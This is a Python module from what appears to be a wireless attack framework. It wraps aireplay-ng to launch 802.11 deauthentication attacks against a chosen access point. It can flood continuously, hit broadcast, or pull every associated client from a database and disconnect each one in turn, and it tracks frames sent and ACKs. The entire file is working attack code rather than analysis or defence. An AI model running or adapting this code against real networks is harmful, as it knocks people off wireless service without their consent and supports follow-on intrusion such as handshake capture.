import asyncio
import os
import re
from typing import Any, Optional
from wcarck.core.module import Module
from wcarck.core.event_bus import bus
from wcarck.hardware.process import ManagedProcess
from wcarck.orchestration.leases import RadioLeaseManager
import structlog

logger = structlog.get_logger()

class DeauthModule(Module):
    """
    Active 802.11 Deauthentication Module.
    Acquires an exclusive monitor.locked lease and runs aireplay-ng.
    """
    
    def __init__(self, lease_manager: RadioLeaseManager):
        self.lease_manager = lease_manager
        self._process: Optional[ManagedProcess] = None
        self._monitor_task: Optional[asyncio.Task] = None
        self._running = False

    @property
    def name(self) -> str:
        return "attack.deauth"

    async def start(self, job_id: str, params: dict[str, Any]) -> None:
        iface = params.get("iface")
        bssid = params.get("bssid")
        client_mac = params.get("client_mac", "FF:FF:FF:FF:FF:FF")
        count = params.get("count", 64)
        continuous = params.get("continuous", False)
        reason = params.get("reason", 1)
        per_client = params.get("per_client", True)
        
        if not iface:
            raise ValueError("Interface is required for deauth")
        if not bssid:
            raise ValueError("Target BSSID is required for deauth")
        
        logger.info(f"Deauth config: target={bssid}, client={client_mac}, count={count}, continuous={continuous}, reason={reason}, per_client={per_client}")

        self.iface = iface
        await self.lease_manager.acquire(job_id, iface, "monitor.locked")
        
        use_d_flag = True
        try:
            proc = await asyncio.create_subprocess_exec(
                "aireplay-ng", "--help",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT
            )
            stdout, _ = await proc.communicate()
            out = stdout.decode(errors="replace")
            if "-D" not in out and "disable AP resolution" not in out.lower():
                use_d_flag = False
        except Exception:
            pass

        target_clients = []
        if client_mac == "FF:FF:FF:FF:FF:FF" and per_client:
            from wcarck.db.session import SessionLocal
            from wcarck.db.models import Client
            from sqlalchemy import select
            
            async with SessionLocal() as session:
                result = await session.execute(
                    select(Client).where(Client.associated_bssid == bssid)
                )
                db_clients = result.scalars().all()
                if db_clients:
                    target_clients = [c.mac for c in db_clients]
                    bus.publish("job.progress", {
                        "job_id": job_id, "module": self.name,
                        "status_message": f"Deauthing {len(target_clients)} clients individually"
                    })
                else:
                    target_clients = ["FF:FF:FF:FF:FF:FF"]
        else:
            target_clients = [client_mac]

        self._running = True
        self._target_clients = target_clients
        self._current_client_idx = 0
        self._deauth_count = count
        self._continuous = continuous
        self._use_d_flag = use_d_flag
        self._bssid = bssid

        await self._run_next_deauth(job_id)
        
        bus.publish("module.started", {"job_id": job_id, "module": self.name})

    async def _run_next_deauth(self, job_id: str):
        if not self._running or self._current_client_idx >= len(self._target_clients):
            if self._running:
                bus.publish("job.completed", {"id": job_id})
                await self.stop(job_id)
            return

        target = self._target_clients[self._current_client_idx]
        deauth_count = "0" if self._continuous else str(self._deauth_count)
        cmd = ["aireplay-ng", "-0", deauth_count, "--ignore-negative-one"]
        if self._use_d_flag:
            cmd.append("-D")
        cmd.extend(["-a", self._bssid])
        if target != "FF:FF:FF:FF:FF:FF":
            cmd.extend(["-c", target])
        cmd.append(self.iface)

        if os.name == 'nt':
            cmd = ["python", "-c", f"import time, sys; print('Sending DeAuth to station {target} -- [10 ACKs]'); time.sleep(2); sys.exit(0)"]

        bus.publish("job.progress", {
            "job_id": job_id, "module": self.name,
            "status_message": f"Deauth burst {self._current_client_idx + 1}/{len(self._target_clients)}: {target}"
        })

        self._process = ManagedProcess(cmd=cmd, job_id=job_id)
        try:
            await self._process.start()
        except Exception as e:
            bus.publish("module.error", {
                "job_id": job_id, "module": self.name,
                "message": f"Failed to start aireplay-ng for {target}: {e}",
                "level": "ERROR"
            })
            self._current_client_idx += 1
            await self._run_next_deauth(job_id)
            return

        self._monitor_task = asyncio.create_task(self._monitor_stdout(job_id))
        
        if self._process and self._process._process:
            try:
                await self._process._process.wait()
            except Exception:
                pass

        if self._monitor_task:
            self._monitor_task.cancel()
            try:
                await self._monitor_task
            except asyncio.CancelledError:
                pass

        self._process = None
        self._current_client_idx += 1

        if self._running and not self._continuous:
            await asyncio.sleep(2)

        await self._run_next_deauth(job_id)

    async def _monitor_stdout(self, job_id: str):
        frames_sent = 0
        ack_count = 0
        
        async for event in bus.subscribe():
            if not self._running:
                break
            if event["topic"] == "process.stdout" and event["payload"].get("job_id") == job_id:
                line = event["payload"].get("line", "")
                
                if "Sending DeAuth" in line or "Deauth burst" in line:
                    frames_sent += 1
                    m = re.search(r'\[\s*(\d+)\s+ACKs\]', line)
                    if m:
                        ack_count += int(m.group(1))
                        
                    bus.publish("job.updated", {
                        "id": job_id,
                        "status": "running",
                        "framesSent": frames_sent,
                        "acks": ack_count,
                        "status_message": f"Sent {frames_sent} deauth bursts. ACKs: {ack_count}"
                    })

    async def stop(self, job_id: str) -> None:
        self._running = False
        self._current_client_idx = 999999
        try:
            if self._monitor_task:
                self._monitor_task.cancel()
            if self._process:
                await self._process.stop()
                self._process = None
        finally:
            if getattr(self, 'iface', None):
                await self.lease_manager.release(job_id, self.iface)
                self.iface = None
                
        bus.publish("module.stopped", {"job_id": job_id, "module": self.name})

    async def status(self, job_id: str) -> dict[str, Any]:
        return {
            "is_running": self._process is not None or (self._running and self._current_client_idx < len(getattr(self, '_target_clients', []))),
            "module": self.name,
            "current_client": self._target_clients[self._current_client_idx] if self._running and self._current_client_idx < len(getattr(self, '_target_clients', [])) else None,
            "clients_remaining": len(getattr(self, '_target_clients', [])) - self._current_client_idx if self._running else 0,
        }
